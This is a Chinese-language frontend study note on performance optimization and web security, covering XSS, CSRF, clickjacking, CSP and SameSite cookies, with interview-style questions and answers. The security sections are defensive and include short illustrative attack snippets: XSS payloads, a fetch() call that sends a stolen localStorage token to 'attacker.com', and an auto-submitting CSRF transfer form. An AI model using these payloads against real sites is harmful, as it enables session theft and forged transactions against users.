# 性能与安全

> 从根级《前端知识点.md》按主题拆分而来。

## 前端性能优化

### 一、先分维度看性能

性能优化不要背零散技巧，先分层：

1. 网络加载性能
2. 渲染性能
3. JavaScript 执行性能
4. 用户交互体验

---

### 二、网络层优化

#### 1. 减少资源体积

- 代码压缩
- Tree Shaking
- 按需加载
- 图片压缩
- 使用 WebP / AVIF

#### 2. 减少请求数量

- 合理拆包，不要过度碎片化
- 小图标使用 SVG / 雪碧图 / iconfont
- 路由级懒加载

#### 3. 提前建立连接

```html
<link rel="dns-prefetch" href="//static.example.com">
<link rel="preconnect" href="https://static.example.com">
```

#### 4. 合理使用缓存

- HTML 协商缓存
- 静态资源长缓存 + hash

---

### 三、渲染层优化

#### 1. 降低重排和重绘成本

- 批量修改 DOM
- 避免频繁读写交替
- 复杂 DOM 更新先脱离文档流再操作

反例：

```javascript
for (let i = 0; i < 1000; i++) {
  el.style.width = i + 'px'
  console.log(el.offsetWidth)
}
```

这会频繁触发强制同步布局。

#### 2. 动画优先使用 `transform` / `opacity`

```css
.box {
  transition: transform .3s, opacity .3s;
}
```

原因：

- 更容易绕开 layout / paint
- 更容易走合成线程

#### 3. 列表优化

- 虚拟列表
- 分页
- 懒渲染

超长列表如果一次性渲染几千个节点，DOM 和布局成本都会很高。

---

### 四、JavaScript 执行优化

#### 1. 防抖与节流

适用场景：

- 防抖：搜索输入、窗口 resize
- 节流：滚动监听、拖拽、mousemove

#### 2. Web Worker

把重计算放到主线程之外，避免阻塞 UI。

适合：

- 大数据处理
- 大文件解析
- 图像处理

#### 3. 避免长任务

如果一个任务执行时间太长，会阻塞：

- 渲染
- 点击响应
- 输入响应

可以通过拆任务、分片执行、`requestIdleCallback`、Worker 等方式优化。

---

### 五、用户体验指标

现在更实用的性能认知，不是“页面快不快”这么模糊，而是看核心指标。

#### Core Web Vitals

- `LCP`：最大内容绘制，衡量加载体验
- `INP`：交互到下一次绘制，衡量交互响应
- `CLS`：累积布局偏移，衡量视觉稳定性

#### 典型优化方向

- `LCP`：优化首屏资源、图片、服务端响应
- `INP`：减少主线程阻塞、优化事件处理
- `CLS`：给图片和广告位预留尺寸，避免内容跳动

---

### 六、面试速答

**Q1：为什么 `transform` 比改 `top/left` 更适合做动画？**  
因为 `top/left` 更容易触发布局，而 `transform` 通常只影响合成阶段。

**Q2：首屏优化最先看什么？**  
先看首屏关键资源、接口响应时间、JS 包体积、图片体积，再看渲染阻塞点。

**Q3：性能优化最忌讳什么？**  
没有指标、没有监控、没有瓶颈定位，直接堆“优化技巧”。

## Web 安全基础

### 一、XSS（Cross-Site Scripting）

XSS 本质是：**攻击者把恶意脚本注入页面，并在受害者浏览器中执行。**

常见危害：

- 窃取登录态
- 窃取用户信息
- 伪造页面操作
- 注入钓鱼内容

#### 常见类型

1. 存储型 XSS
2. 反射型 XSS
3. DOM 型 XSS

#### 典型危险代码

```javascript
el.innerHTML = userInput
```

如果 `userInput` 可控，就可能插入恶意脚本。

#### 防御手段

1. 所有不可信内容默认做转义
2. 少用 `innerHTML`，优先 `textContent`
3. 富文本场景使用白名单过滤
4. 配置 CSP（Content Security Policy）

---

### 二、CSRF（Cross-Site Request Forgery）

CSRF 本质是：**攻击者诱导用户在已登录状态下，向目标站点发起非本人意愿的请求。**

为什么会发生？

- 浏览器在“向目标站点发请求”时，可能按 Cookie 策略自动携带该站点的 Cookie
- 服务端如果只认 Cookie，不校验请求来源，就可能中招

#### 防御手段

1. CSRF Token
2. `SameSite` Cookie
3. 校验 `Origin` / `Referer`
4. 关键操作二次确认

---

### 三、点击劫持（Clickjacking）

攻击者把你的页面嵌进透明 iframe，诱导用户点击看不见的真实按钮。

防御：

```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none';
```

---

### 四、CSP（内容安全策略）

CSP 是浏览器安全白名单机制，用来限制页面可以执行哪些资源。

例如：

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
```

作用：

- 限制脚本来源
- 降低 XSS 成功率
- 限制内联脚本、第三方恶意注入

---

### 五、`Cookie` 安全属性

```http
Set-Cookie: sid=abc; HttpOnly; Secure; SameSite=Lax
```

常见属性：

- `HttpOnly`：禁止 JS 读取，降低被 XSS 窃取风险
- `Secure`：只在 HTTPS 下传输
- `SameSite`：限制跨站请求携带 Cookie

#### `SameSite`

- `Strict`：最严格，几乎不允许跨站携带
- `Lax`：相对平衡，现代浏览器常见默认值
- `None`：允许跨站，但必须配合 `Secure`

---

### 六、面试速答

**Q1：XSS 和 CSRF 的本质区别？**  
XSS 是“把恶意脚本注入你的页面里执行”；CSRF 是“借你的登录态去发请求”。

**Q2：有了 `HttpOnly` 就绝对不怕 XSS 吗？**  
不是。`HttpOnly` 只能防止 Cookie 被 JS 直接读取，但页面中的恶意脚本仍可能执行其他危险操作。

**Q3：为什么 `SameSite` 能缓解 CSRF？**  
因为它可以限制浏览器在跨站请求时自动携带目标站点 Cookie，从根源上削弱“借用户身份发请求”的条件。

## XSS 详解

### 一、XSS 的本质到底是什么

XSS（Cross-Site Scripting）本质是：**攻击者把恶意脚本注入页面，并在受害者浏览器中执行。**

它危险的根本原因是：

> 一旦脚本在你的站点上下文中执行，浏览器会把它当成“这个站点自己的代码”。

于是它就有机会：

- 读取页面数据
- 操作 DOM
- 发起同源请求
- 冒充用户执行操作

所以 XSS 的重点不是“弹窗”，而是：

> **攻击者获得了在你页面里执行任意 JavaScript 的能力。**

---

### 二、XSS 是怎么发生的

XSS 的根源可以概括成一句话：

> **本来应该被当成普通文本的数据，被浏览器当成了可执行代码。**

典型危险代码：

```javascript
el.innerHTML = userInput
```

如果 `userInput` 来自不可信来源，例如：

- 用户输入
- URL 参数
- 第三方接口返回
- 富文本内容

攻击者就可能构造：

```html
<img src=x onerror="alert('xss')">
```

或者：

```html
<script>steal()</script>
```

当页面把这段内容当 HTML 解析时，脚本就执行了。

---

### 三、XSS 的真实危害

很多人学 XSS 时只记住：

```javascript
alert(1)
```

但真实危害远远不止这个。

#### 1. 窃取登录态

如果站点把敏感令牌放在 JS 能读到的地方，例如：

- `localStorage`
- 非 `HttpOnly` Cookie
- 页面变量

恶意脚本就可能把这些信息发给攻击者。

#### 2. 窃取页面隐私数据

例如读取：

- 手机号
- 邮箱
- 表单输入
- 页面中的隐私信息

#### 3. 冒充用户执行操作

即使拿不到 Cookie，脚本只要已经运行在当前站点上下文中，仍然可能：

- 发起转账
- 删除数据
- 修改资料
- 提交后台操作

#### 4. 注入钓鱼界面

攻击者可以直接改 DOM，伪造：

- 登录弹窗
- 支付确认框
- 验证码输入框

诱导用户继续输入敏感信息。

---

### 四、XSS 的三大类型

#### 1. 存储型 XSS

恶意脚本被保存到服务端数据库，之后访问该页面的用户都会中招。

典型场景：

- 评论区
- 帖子内容
- 用户昵称
- 富文本内容

这类最危险，因为：

> **攻击一次，后续访问者都可能持续中招。**

#### 2. 反射型 XSS

恶意脚本通常放在 URL 参数里，服务端收到请求后又把参数原样拼回响应页面。

例如：

```text
https://example.com/search?q=<script>alert(1)</script>
```

如果服务端把 `q` 直接回显到 HTML 中且没做转义，脚本就会执行。

这类通常需要诱导用户点击恶意链接。

#### 3. DOM 型 XSS

这类不一定经过服务端，而是前端 JS 自己把危险内容写进 DOM。

例如：

```javascript
const keyword = location.hash.slice(1)
result.innerHTML = keyword
```

如果 URL 是：

```text
https://example.com/#<img src=x onerror=alert(1)>
```

脚本就可能直接在浏览器端触发。

---

### 五、哪些 API 最危险

常见危险注入点包括：

- `innerHTML`
- `outerHTML`
- `insertAdjacentHTML`
- `document.write`
- `eval`
- `new Function`
- 把不可信字符串写进事件属性、内联脚本、`javascript:` URL

例如：

```javascript
el.innerHTML = userInput
link.href = userInput
eval(userInput)
```

它们共同的问题是：

> 会把字符串当成 HTML / JS / 可执行内容解释。

---

### 六、为什么“转义”是第一原则

防 XSS 的根本思路不是“正则拦一下”，而是：

> **所有不可信内容默认按文本处理，而不是按 HTML / JS 处理。**

例如：

```javascript
el.textContent = userInput
```

即使 `userInput` 里包含：

```html
<script>alert(1)</script>
```

浏览器也只会把它当文本显示，不会执行。

#### 为什么黑名单不靠谱

因为攻击者绕过方式太多：

- 大小写混写
- 编码绕过
- 事件属性变体
- SVG / MathML 等特殊上下文

所以“只过滤 `<script>`”远远不够。

---

### 七、前端如何防御 XSS

#### 1. 所有不可信内容默认转义

这是第一原则。

#### 2. 少用危险 DOM API

优先：

```javascript
textContent
createElement
appendChild
```

谨慎使用：

```javascript
innerHTML
outerHTML
insertAdjacentHTML
document.write
```

#### 3. 富文本必须白名单过滤

如果业务真的要渲染 HTML，例如：

- 富文本编辑器
- CMS 内容
- Markdown 转 HTML

那就不能靠简单 replace，而要：

> **只允许安全标签、允许安全属性、过滤危险协议和事件属性。**

#### 4. 配置 CSP

CSP（Content Security Policy）是第二道防线，不替代转义，但能降低注入成功率。

#### 5. 敏感 Cookie 加 `HttpOnly`

它不能消灭 XSS，但能降低“直接偷 Cookie”的风险。

要注意：

> `HttpOnly` 只能防止 JS 读取 Cookie，防不了脚本继续操作页面和接口。

---

#### 6. XSS 到底能不能读 `localStorage` 和 Cookie

这个问题非常关键，很多人会混淆：

> “XSS 到底能读到哪些浏览器存储？”

如果恶意脚本已经通过 XSS 跑在**当前源**的页面上下文里，那么它通常拥有和你业务代码几乎一样的前端权限。

也就是说，它通常可以直接读取：

- `localStorage`
- `sessionStorage`
- `IndexedDB`
- 非 `HttpOnly` Cookie

#### 为什么 `localStorage` 通常能直接读

因为 `localStorage` 本来就是提供给当前页面 JS 使用的：

```javascript
localStorage.getItem('token')
localStorage.setItem('token', 'abc')
```

所以只要 XSS 脚本已经运行在这个源下，它同样可以这样读：

```javascript
const token = localStorage.getItem('token')
```

再把它发到攻击者服务器：

```javascript
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: token
})
```

#### 这里要注意一个前提

它能读的是：

> **当前源自己的 `localStorage`**

而不是跨源乱读别的网站的存储。

所以更准确的说法是：

> 一旦同源 XSS 成立，当前源里的 `localStorage` 通常就等于对攻击者开放。

#### 普通 Cookie 能不能读

如果 Cookie 没有加 `HttpOnly`，JS 通常可以通过：

```javascript
document.cookie
```

直接读到它。

所以如果把高价值 token 放在“普通 Cookie”里，XSS 一样可能把它偷走。

#### `HttpOnly` Cookie 能不能读

不能被 JS 直接读取。

这就是 `HttpOnly` 的核心意义：

> **禁止脚本通过 `document.cookie` 直接读这个 Cookie 的值。**

所以在“防止被 XSS 直接把凭证原文偷走”这件事上，`HttpOnly` 比 `localStorage` 和普通 Cookie 都更强。

#### 但为什么说 `HttpOnly` 也不能彻底防 XSS

因为 XSS 的能力不只是“读值”，还包括：

- 操作页面
- 读取页面数据
- 发起同源请求
- 冒充当前用户执行操作

即使恶意脚本拿不到 `HttpOnly` Cookie 的原文，浏览器在向当前站点发请求时仍可能自动携带这个 Cookie。  
于是攻击者仍然可以“借你的登录态继续做事”。

所以：

- `HttpOnly` 防的是“直接读取 Cookie 值”
- 防不了“借当前登录态继续发请求”

#### 为什么很多时候说 `localStorage` 风险更高

因为它对 JS 完全开放。

也就是说，一旦发生同源 XSS：

- `localStorage` 里的 token 往往能被直接拿走
- 普通 Cookie 也可能被直接拿走
- `HttpOnly` Cookie 至少多了一层“不能被 JS 直接读”的保护

所以工程实践里常见的倾向是：

- 高价值会话标识更倾向放在 `HttpOnly + Secure` Cookie
- 不轻易把长期高价值 token 裸放进 `localStorage`

但这不等于：

> “用了 `HttpOnly Cookie` 就不怕 XSS”

它只是比 `localStorage` 更抗“直接窃取”。

#### 一张表快速记忆

| 存储位置 | XSS 能否直接读到 |
|---|---|
| `localStorage` | 通常能 |
| `sessionStorage` | 通常能 |
| 普通 Cookie | 通常能 |
| `HttpOnly` Cookie | 不能直接读 |
| `IndexedDB` | 通常能 |

#### 一句话总结

> 一旦同源 XSS 成立，`localStorage`、`sessionStorage`、普通 Cookie、`IndexedDB` 通常都可能被直接读取；`HttpOnly` Cookie 不能被 JS 直接读，但攻击者仍可能借浏览器自动携带它的能力，继续冒充当前用户发请求。

---

### 八、React / Vue 会自动防 XSS 吗

不能简单说“会”或“不会”。

现代框架对普通模板插值通常会转义，例如：

```jsx
<div>{userInput}</div>
```

```vue
<div>{{ userInput }}</div>
```

这通常相对安全。

但只要你显式进入“原始 HTML 渲染”模式，风险就回来了：

- React：`dangerouslySetInnerHTML`
- Vue：`v-html`

例如：

```jsx
<div dangerouslySetInnerHTML={{ __html: html }} />
```

```vue
<div v-html="html"></div>
```

如果 `html` 不可信，照样可能 XSS。

---

### 九、XSS 防御清单

可以快速记成：

1. 所有不可信内容默认转义
2. 优先 `textContent`，少用 `innerHTML`
3. 富文本场景做白名单过滤
4. 配置 CSP
5. 敏感 Cookie 加 `HttpOnly`
6. 谨慎使用 `v-html` / `dangerouslySetInnerHTML`

---

### 十、一句话总结 XSS

> XSS 的本质是“把本来应该当文本的数据，变成了浏览器会执行的代码”；防御核心是“默认转义 + 减少危险注入点 + 富文本白名单 + CSP 多层兜底”。

## CSRF 详解

### 一、CSRF 的本质到底是什么

CSRF（Cross-Site Request Forgery）本质是：**攻击者诱导用户在已登录状态下，向目标站点发起非本人意愿的请求。**

它和 XSS 最大的不同在于：

> XSS 是“脚本跑进你的站点里”；  
> CSRF 是“攻击者借你的浏览器和登录态，替你向目标站点发请求”。

也就是说，CSRF 不一定要执行目标站点的 JS，  
它只需要让受害者浏览器帮它把请求发出去。

---

### 二、为什么会发生

CSRF 能成立，通常依赖两个条件：

#### 1. 浏览器在向目标站点发请求时，可能按策略自动携带该站点 Cookie

如果你已经登录了：

```text
bank.com
```

浏览器里已经有 `bank.com` 的登录 Cookie。  
当恶意页面诱导浏览器向 `bank.com` 发请求时，浏览器可能会在这次“发往 `bank.com` 的请求”上自动携带这些 Cookie。

#### 2. 服务端只认 Cookie，不校验请求是否真的是用户本人发起

如果后端判断逻辑只是：

> “只要 Cookie 有效，你就是合法用户”

那它就可能把攻击者伪造的请求也当成真实用户操作。

---

### 三、一个最经典的攻击过程

假设银行转账接口是：

```http
POST https://bank.com/transfer
```

攻击者在恶意页面放一个表单：

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>

<script>
  document.forms[0].submit()
</script>
```

如果受害者此时正好登录着 `bank.com`，浏览器提交这个表单、并向 `bank.com` 发请求时，就可能在这次请求上自动携带 `bank.com` 的 Cookie。  
如果服务端没有 CSRF 防护，这笔请求就可能被当成真实转账。

这就是 CSRF 的本质：

> **攻击者不需要知道你的密码，它直接借你的登录态做事。**

---

### 四、为什么同源策略不能天然防住 CSRF

很多人会想：

> “不是有同源策略吗？跨站请求不是应该被拦住吗？”

这里要区分：

- 同源策略主要限制的是：**JS 能不能读响应**
- CSRF 需要的是：**请求能不能发出去**

浏览器允许很多跨站请求发出，例如：

- 表单提交
- 图片请求
- 导航请求
- 某些资源请求

攻击者很多时候根本不需要读响应内容，  
它只关心：

> “这个请求有没有成功触发目标操作。”

所以同源策略并不能天然防住 CSRF。

---

### 五、常见触发方式

#### 1. 表单自动提交

这是最经典的 CSRF 方式。

#### 2. 图片 / 资源请求

如果后端错误地把“修改状态”设计成 GET 请求，就很危险：

```html
<img src="https://example.com/delete?id=1">
```

浏览器一加载图片，请求就发出去了。

这也是为什么：

> **有副作用的操作不要用 GET。**

#### 3. 隐藏 iframe

历史上也常见用隐藏 iframe 触发表单或页面请求。

---

### 六、CSRF 的目标是“伪造操作”，不是“窃取数据”

XSS 更像：

> “读取、执行、注入”

CSRF 更像：

> “伪造一次用户本人没有主动发起的请求”

所以它常见影响包括：

- 转账
- 修改密码
- 修改邮箱
- 删除数据
- 点赞/关注/解绑
- 提交后台管理操作

---

### 七、CSRF 的核心防御手段

#### 1. CSRF Token

这是最经典、最通用的方案。

思路是：

1. 服务端给当前用户生成一个随机 Token
2. 页面发请求时，前端把这个 Token 一起带上
3. 服务端验证 Token 是否正确

攻击者虽然能诱导浏览器在向目标站点发请求时自动携带 Cookie，  
但通常拿不到页面里的这个 Token，因此很难伪造合法请求。

#### 2. `SameSite` Cookie

例如：

```http
Set-Cookie: sid=abc; HttpOnly; Secure; SameSite=Lax
```

`SameSite` 的作用是：

> 限制浏览器在跨站请求时自动携带目标站点 Cookie

常见取值：

- `Strict`
- `Lax`
- `None`

要注意：

> `SameSite` 很重要，但不要把它理解成“有了它就不需要 Token”。

工程上更稳的做法通常是多层防线并用。

#### 3. 校验 `Origin` / `Referer`

服务端可以检查：

- `Origin`
- `Referer`

如果请求来源明显是第三方恶意站点，就拒绝。

这类方案常作为辅助防线，而不是唯一防线。

#### 4. 关键操作二次确认

例如：

- 输入支付密码
- 短信验证码
- 二次弹窗确认
- 人机验证

它不能替代底层防护，但能显著降低高风险操作被静默伪造的概率。

---

### 八、JWT 就天然没有 CSRF 吗

不能一概而论。

关键不是“是不是 JWT”，而是：

> **认证凭证存在哪、由谁带出去。**

#### 如果 JWT 放在 Cookie 里

浏览器在向目标站点发请求时仍可能按策略自动携带它，CSRF 风险依然存在。

#### 如果 JWT 放在 `localStorage`，再由 JS 手动塞进 `Authorization`

这种模式通常不再是经典 Cookie 型 CSRF，但会更暴露在 XSS 风险下。

所以不能简单说：

- JWT = 没有 CSRF
- Session = 一定有 CSRF

真正要看的是认证凭证的传递机制。

---

### 九、一个高频误区

很多人以为：

> “只要用了 POST，就不会有 CSRF”

这是错的。

POST 也完全可能被伪造。  
正确说法是：

- 有副作用操作不该用 GET
- 但用了 POST 也仍然需要 CSRF 防护

---

### 十、CSRF 防御清单

可以快速记成：

1. 敏感操作加 CSRF Token
2. Cookie 配置 `SameSite`
3. 服务端校验 `Origin` / `Referer`
4. 高风险操作做二次确认
5. 有副作用操作不要设计成 GET

---

### 十一、一句话总结 CSRF

> CSRF 的本质不是“偷你数据”，而是“借你的登录态替你发请求”；防御核心是让服务端不仅认 Cookie，还要能识别“这是不是当前真实页面、当前真实用户主动发起的请求”。

---

## `SameSite` 详解

### 一、`SameSite` 是干什么的

`SameSite` 是 `Cookie` 的一个属性，用来控制：

> 浏览器在跨站请求场景下，要不要自动携带这个 Cookie。

例如：

```http
Set-Cookie: sid=abc; HttpOnly; Secure; SameSite=Lax
```

这里的 `SameSite=Lax`，就是在告诉浏览器：

> “这个 Cookie 在跨站场景下不要随便带，按 Lax 规则来。”

这也是它能缓解 CSRF 的原因之一。

---

### 二、`Strict` 表示什么

`Strict` 是最严格的策略。

可以粗略理解成：

> 只要是跨站场景，就尽量不带这个 Cookie。

它的安全性最高，因为能最大程度减少：

- 别的站点诱导浏览器向当前站点发请求时
- 顺手把当前站点登录态 Cookie 一起带上

但代价是可用性会更严格：

- 某些正常跳转后的体验可能受影响
- 某些依赖跨站上下文的业务不方便做

适合：

- 极高敏感度的会话 Cookie
- 关键安全操作相关 Cookie

---

### 三、`Lax` 表示什么

`Lax` 是相对平衡、最常用的策略。

可以粗略理解成：

> 大多数跨站子请求不带 Cookie，但部分“用户显式导航到目标站点”的场景可以带。

它通常能拦住很多典型 CSRF 场景，例如：

- 隐藏表单自动提交
- 图片请求
- iframe 中的跨站请求

但对于某些用户主动触发的顶级导航场景，它相对更宽松。

这也是为什么它在现代浏览器中很常见：

> 安全性和可用性之间更平衡。

适合：

- 大多数普通登录态 Cookie

---

### 四、`None` 表示什么

`None` 是最宽松的策略。

含义是：

> 允许跨站请求携带这个 Cookie。

但它有一个前提：

```http
SameSite=None; Secure
```

也就是说，`None` 必须和 `Secure` 一起使用。  
如果没有 `Secure`，现代浏览器通常会直接拒绝这种 Cookie。

适合：

- 确实需要跨站携带 Cookie 的业务
- 某些第三方登录
- 某些联合身份或跨站嵌入场景

它的风险也最高，因为如果没有其它防护，CSRF 风险会明显上升。

---

### 五、一张表记住三者区别

| 值 | 含义 |
|---|---|
| `Strict` | 跨站基本都不带 |
| `Lax` | 大多数跨站子请求不带，部分顶级导航场景可带 |
| `None` | 允许跨站带，但必须配合 `Secure` |

---

### 六、怎么选

可以直接这样记：

- `Strict`：最安全，最严格
- `Lax`：默认常用，安全和可用性平衡
- `None`：允许跨站发送，风险最高

如果你只是普通站点登录态，通常优先考虑：

```http
SameSite=Lax
```

如果是极高敏感度 Cookie，可以考虑更严格的策略；  
如果业务确实必须跨站携带 Cookie，才考虑 `None`，并且一定要配合其它防护措施。

---

### 七、一个重要提醒

`SameSite` 很重要，但不要把它理解成：

> “只要配了 `SameSite`，就完全不需要 CSRF Token 了。”

更稳妥的工程实践通常仍然是多层防线并用：

1. `SameSite`
2. CSRF Token
3. `Origin / Referer` 校验
4. 高风险操作二次确认

---

### 八、一句话总结

`Strict` 最严格、最安全；`Lax` 最常用、最平衡；`None` 允许跨站携带但风险最高，且必须配合 `Secure`。
